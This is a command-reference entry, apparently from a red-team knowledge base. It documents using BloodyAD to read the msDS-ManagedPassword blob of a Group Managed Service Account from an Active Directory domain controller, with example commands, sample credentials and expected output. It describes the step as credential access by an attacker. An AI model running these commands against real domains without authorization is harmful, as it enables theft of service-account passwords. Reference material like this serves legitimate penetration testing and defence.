---
id: e82d72ec-dfea-4946-aaa2-272c4f533ea4
name: Get-GMSA-Object-Attributes-with-BloodyAD
type: command
executor: bash
data: >-
  python bloodyAD.py -u $_USERNAME -d $_DOMAIN -p $_PASSWORD --host $_DC_HOST
  getObjectAttributes $_GMSA_NAME msDS-ManagedPassword
output: null
created_at: '2023-04-06T03:56:06.961835+00:00'
updated_at: '2023-04-10T20:26:00.828959+00:00'
platforms:
  - Linux
  - Windows
  - Active Directory
tags:
  - active-directory
  - credential-access
  - ldap
verified: true
validated: true
---

# Get-GMSA-Object-Attributes-with-BloodyAD

## Command

```bash
python bloodyAD.py -u $_USERNAME -d $_DOMAIN -p $_PASSWORD --host $_DC_HOST getObjectAttributes $_GMSA_NAME msDS-ManagedPassword
```

## Description

This command uses the BloodyAD Python tool to query specific attributes (like msDS-ManagedPassword) of a GMSA account via LDAP against an Active Directory Domain Controller. It is used when the attacker has credentials with read permissions to extract sensitive blobs for further decoding, enabling credential access in AD environments.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -u $_USERNAME | Username for authenticating to the domain | Yes |
| -d $_DOMAIN | Name of the target domain | Yes |
| -p $_PASSWORD | Password for the authenticating user | Yes |
| --host $_DC_HOST | IP address or hostname of the Domain Controller | Yes |
| getObjectAttributes | Subcommand to retrieve object attributes | Yes |
| $_GMSA_NAME | Name of the GMSA account (e.g., gmsaAccount$) | Yes |
| msDS-ManagedPassword | The specific attribute to retrieve (GMSA password blob) | Yes |

## Examples

### Basic Usage

```bash
python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes SQL_HQ_Primary$ msDS-ManagedPassword
```

### Advanced Usage

For multiple attributes or scripted use:

```bash
python bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes SQL_HQ_Primary$ msDS-ManagedPassword,msDS-GroupMSAMembership
```

## Expected Output

Successful execution returns LDAP query results, including the raw msDS-ManagedPassword blob in binary or base64 format:

```
[*] Retrieving attributes for CN=SQL_HQ_Primary,CN=Managed Service Accounts,DC=bloody,DC=local
msDS-ManagedPassword: [binary blob data here]
```

If permissions are insufficient, it will error with LDAP access denied. The blob requires offline decoding for the plaintext password.

## Related

- [[procedures/Abuse-AD-ACLs-ACEs-to-Retrieve-GMSA-Password]]
- [[tools/BloodyAD]]
